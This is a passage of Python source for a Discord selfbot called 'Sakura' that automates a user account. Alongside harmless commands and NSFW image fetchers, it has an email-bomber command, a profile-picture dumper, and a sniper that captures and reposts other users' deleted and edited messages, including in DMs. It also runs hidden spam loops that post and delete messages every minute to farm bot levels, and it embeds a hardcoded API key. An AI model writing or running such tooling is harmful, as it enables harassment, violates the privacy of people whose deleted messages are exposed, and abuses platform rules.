    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@Sakura.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)

@Sakura.command()
async def topic(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

@Sakura.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=em)

@Sakura.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Sakura.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")
		   
@Sakura.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()   
    em.set_image(url=res['url'])
    await ctx.send(embed=em) 

@Sakura.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Sakura.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    
@Sakura.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em) 

@Sakura.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

    
@Sakura.command()  
async def feed(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def tickle(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
@Sakura.command()
async def slap(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def hug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def smug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def pat(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command()
async def kiss(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Sakura.command(aliases=['proxy','scraper'])
async def proxies(ctx):
    await ctx.message.delete()
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")

@Sakura.command()
async def uptime(ctx):
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@Sakura.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Sakura.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Sakura.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in Sakura.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Sakura.command(aliase=['streaming'])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await Sakura.change_presence(activity=stream)    

@Sakura.command()
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Sakura.change_presence(activity=game)

@Sakura.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Sakura.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@Sakura.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await Sakura.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@Sakura.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Sakura.guilds:
        await guild.ack()

@Sakura.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@Sakura.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**'+message+'**')

@Sakura.command()
async def secret(ctx, *, message):
	await ctx.message.delete()
	await ctx.send('||'+message+'||')

@Sakura.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")

@Sakura.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx):
    await ctx.message.delete()
    print(f"HWID: LIGHTYELLOW_EX{hwid}"+Fore.RESET)

@Sakura.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))

@Sakura.command()
async def everyone(ctx):
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')

@Sakura.command()
async def logout(ctx):
    await ctx.message.delete()
    await Sakura.logout()

@Sakura.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):
    await ctx.message.delete()   
    btc_status.start()        

@Sakura.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx):
    await ctx.message.delete()
    Dump(ctx)

@Sakura.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx):
    await ctx.message.delete()
    Clear()

@Sakura.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())

@Sakura.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):
    await ctx.message.delete()
    GmailBomber()
@Sakura.command(name='soff', aliases=['status-off', 'Soff'])
async def statusoff(ctx):
    await Sakura.change_presence(status=discord.Status.online)
    await ctx.message.delete()


@Sakura.command(aliases=['queue'])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(Sakura.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        voice.play('song.mp3')
    else:
        await ctx.send('You need to be a in VC to play music')


@Sakura.command()
async def stop(ctx):
    await ctx.message.delete()
    await ctx.send("Stopped the music player!")


@Sakura.command()
async def skip(ctx):
    await ctx.message.delete()
    await ctx.send("Skipped song!")


@Sakura.command(aliases=["lyric"])
async def lyrics(ctx, *, args):
    await ctx.message.delete()
    await ctx.send("Showing lyrics for " + args)


@Sakura.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Sakura.msgsniper = True
        await ctx.send('Sakura Message-Sniper is now **enabled**', delete_after=2)
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Sakura.msgsniper = False
        await ctx.send('Sakura Message-Sniper is now **disabled**', delete_after=2)


@Sakura.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    Sakura.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
        Sakura.antiraid = True
        await ctx.send('Anti-Nuke is now **enabled**', delete_after=3)
    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
        Sakura.antiraid = False
        await ctx.send('Anti-Nuke is now **disabled**', delete_after=3)


@Sakura.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send("Please specify a user to whitelist")
    else:
        if ctx.guild.id not in Sakura.whitelisted_users.keys():
            Sakura.whitelisted_users[ctx.guild.id] = {}
        if user.id in Sakura.whitelisted_users[ctx.guild.id]:
            await ctx.send('That user is already whitelisted')
        else:
            Sakura.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                      "\_") + "#" + user.discriminator + "**")
    # else:
    #     user = Sakura.get_user(id)
    #     if user is None:
    #         await ctx.send("Couldn't find that user")
    #         return
    #     if ctx.guild.id not in Sakura.whitelisted_users.keys():
    #         Sakura.whitelisted_users[ctx.guild.id] = {}
    #     if user.id in Sakura.whitelisted_users[ctx.guild.id]:
    #         await ctx.send('That user is already whitelisted')
    #     else:
    #         Sakura.whitelisted_users[ctx.guild.id][user.id] = 0
    #         await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")


@Sakura.command(aliases=['wld'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in Sakura.whitelisted_users:
            for key2 in Sakura.whitelisted_users[key]:
                user = Sakura.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + Sakura.get_guild(
                    key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
        await ctx.send(whitelist)
    else:
        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                       "\_") + '\'s Whitelisted Users:`\n'
        for key in Sakura.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Sakura.whitelisted_users[ctx.guild.id]:
                    user = Sakura.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                  "\_") + "#" + user.discriminator + " (" + str(
                        user.id) + ")" + "**\n"
        await ctx.send(whitelist)


@Sakura.command(aliases=['uwl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send("Please specify the user you would like to unwhitelist")
    else:
        if ctx.guild.id not in Sakura.whitelisted_users.keys():
            await ctx.send("That user is not whitelisted")
            return
        if user.id in Sakura.whitelisted_users[ctx.guild.id]:
            Sakura.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Sakura.get_user(user.id)
            await ctx.send(
                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')


@Sakura.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    Sakura.whitelisted_users.clear()
    await ctx.send('Successfully cleared the whitelist hash')


@Sakura.command()
async def yuikiss(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Kiss in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Kiss", delete_after=3)
            return
        Sakura.yui_kiss_user = user.id
        Sakura.yui_kiss_channel = ctx.channel.id
        if Sakura.yui_kiss_user is None or Sakura.yui_kiss_channel is None:
            await ctx.send('An impossible error occured, try again later or contact Sakura')
            return
        while Sakura.yui_kiss_user is not None and Sakura.yui_kiss_channel is not None:
            await Sakura.get_channel(Sakura.yui_kiss_channel).send('yui kiss ' + str(Sakura.yui_kiss_user),
                                                                   delete_after=0.1)
            await asyncio.sleep(60)


@Sakura.command()
async def yuihug(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Hug", delete_after=3)
            return
        Sakura.yui_hug_user = user.id
        Sakura.yui_hug_channel = ctx.channel.id
        if Sakura.yui_hug_user is None or Sakura.yui_hug_channel is None:
            await ctx.send('An impossible error occured, try again later or contact Sakura')
            return
        while Sakura.yui_hug_user is not None and Sakura.yui_hug_channel is not None:
            await Sakura.get_channel(Sakura.yui_hug_channel).send('yui hug ' + str(Sakura.yui_hug_user),
                                                                  delete_after=0.1)
            await asyncio.sleep(60)


@Sakura.command()
async def yuistop(ctx):
    await ctx.message.delete()
    Sakura.yui_kiss_user = None
    Sakura.yui_kiss_channel = None
    Sakura.yui_hug_user = None
    Sakura.yui_hug_channel = None
    await ctx.send('Successfully **disabled** Yui Loops', delete_after=3)


@Sakura.command(aliases=['automee6'])
async def mee6(ctx, param=None):
    await ctx.message.delete()
    if param is None:
        await ctx.send("Please specify yes or no", delete_after=3)
        return
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
            await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
            return
        else:
            Sakura.mee6 = True
            await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
            Sakura.mee6_channel = ctx.channel.id
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Sakura.mee6 = False
        await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
    while Sakura.mee6 is True:
        sentences = ['Stop waiting for exceptional things to just happen.',
                     'The lyrics of the song sounded like fingernails on a chalkboard.',
                     'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
                     'He had a hidden stash underneath the floorboards in the back room of the house.',
                     'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
                     'People generally approve of dogs eating cat food but not cats eating dog food.',
                     'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
                     'She was the type of girl who wanted to live in a pink house.',
                     'The bees decided to have a mutiny against their queen.',
                     'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
                     'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
                     'They desperately needed another drummer since the current one only knew how to play bongos.',
                     'He waited for the stop sign to turn to a go sign.',
                     'His thought process was on so many levels that he gave himself a phobia of heights.',
                     'Her hair was windswept as she rode in the black convertible.',
                     'Karen realized the only way she was getting into heaven was to cheat.',
                     'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
                     'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
                     'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
                     'You probably shouldn\'t look at your feet.',
                     'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
                     'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
                     'The three-year-old girl ran down the beach as the kite flew behind her.',
                     'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
                     'They improved dramatically once the lead singer left.',
                     'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
                     'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
                     'People keep telling me "orange" but I still prefer "pink".',
                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                     'I liked their first two albums but changed my mind after that charity gig.',
                     'Plans for this weekend include turning wine into water.',
                     'A kangaroo is really just a rabbit on steroids.',
                     'He played the game as if his life depended on it and the truth was that it did.',
                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
                     'She let the balloon float up into the air with her hopes and dreams.',
                     'There was coal in his stocking and he was thrilled.',
                     'This made him feel like an old-style rootbeer float smells.',
                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                     'The light in his life was actually a fire burning all around him.',
                     'Truth in advertising and dinosaurs with skateboards have much in common.',
                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                     'The view from the lighthouse excited even the most seasoned traveler.',
                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                     'It\'s difficult to understand the lengths he\'d go to remain short.',
                     'Nobody questions who built the pyramids in Mexico.',
                     'They ran around the corner to find that they had traveled back in time.']
        await Sakura.get_channel(Sakura.mee6_channel).send(random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)


@Sakura.command(aliases=['slotsniper', 'slotbotsniper'])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Sakura.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Sakura.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Sakura.slotbot_sniper = False


@Sakura.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Sakura.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Sakura.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Sakura.giveaway_sniper = False


@Sakura.event
async def on_message_delete(message):
    if message.author.id == Sakura.user.id:
        return
    if Sakura.msgsniper:
        # if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel): \\ removed so people cant get you disabled
        if isinstance(message.channel, discord.DMChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Sakura.sniped_message_dict) > 1000:
        Sakura.sniped_message_dict.clear()
    if len(Sakura.snipe_history_dict) > 1000:
        Sakura.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Sakura.sniped_message_dict.update({channel_id: message_content})
        if channel_id in Sakura.snipe_history_dict:
            pre = Sakura.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Sakura.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Sakura.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
        Sakura.sniped_message_dict.update({channel_id: message_content})


@Sakura.event
async def on_message_edit(before, after):
    if before.author.id == Sakura.user.id:
        return
    if Sakura.msgsniper:
        if before.content is after.content:
            return
        # if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel): \\ removed so people cant get you disabled
        if isinstance(before.channel, discord.DMChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Sakura.sniped_edited_message_dict) > 1000:
        Sakura.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Sakura.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Sakura.sniped_edited_message_dict.update({channel_id: message_content})


@Sakura.command(aliases=['clearhistory'])
async def clearsnipehistory(ctx):
    await ctx.message.delete()
    del Sakura.snipe_history_dict[ctx.channel.id]
    await ctx.send("Cleared Snipe History of " + ctx.channel.name, delete_after=3)

@Sakura.command(aliases=['history'])
async def snipehistory(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Sakura.snipe_history_dict:
        try:
            await ctx.send(Sakura.snipe_history_dict[currentChannel])
        except:
            del Sakura.snipe_history_dict[currentChannel]
    else:
        await ctx.send("Snipe History is empty!", delete_after=3)
@Sakura.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Sakura.sniped_message_dict:
        await ctx.send(Sakura.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!", delete_after=3)


@Sakura.command(aliases=['esnipe'])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Sakura.sniped_edited_message_dict:
        await ctx.send(Sakura.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!", delete_after=3)


@Sakura.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Sakura.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


@Sakura.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)



@Sakura.command(aliases=['giphy', 'tenor', 'searchgif'])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])


@Sakura.command(aliases=['img', 'searchimg', 'searchimage', 'imagesearch', 'imgsearch'])
async def image(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Sakura_img.png"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await ctx.send("Nothing found for **" + args + "**")


@Sakura.command(aliases=['addemoji', 'stealemote', 'addemote'])
async def stealemoji(ctx):
    await ctx.message.delete()
    custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
